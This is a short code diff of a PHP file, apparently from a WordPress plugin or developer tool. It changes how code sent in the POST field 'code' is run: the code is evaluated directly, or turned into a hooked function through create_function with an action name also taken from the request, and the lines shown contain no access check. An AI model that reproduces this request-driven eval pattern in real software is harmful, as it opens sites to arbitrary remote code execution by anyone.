@@ -32,17 +32,12 @@ if ( isset( $_POST['full'] ) ) {
 	add_filter( 'template_include', 'ub_load_blank_template' );
 
 	if ( isset( $_POST['code'] ) ) {
-
 		if ( isset( $_POST['action'] ) ) {
-			add_action( $_POST['action'], function() {
-				if ( false === eval( $_POST['code'] ) )
-					echo 'PHP Error encountered, execution halted';
-				exit;
-			} );
+			$function = create_function( '$args', $_POST['code'] );
+			add_action( $_POST['action'], $function, 999, 999 );
 		} else {
 			if ( false === eval( $_POST['code'] ) )
-				echo 'PHP Error encountered, execution halted';
-			exit;
+				echo 'PHP Error encountered';
 		}
 
 	}
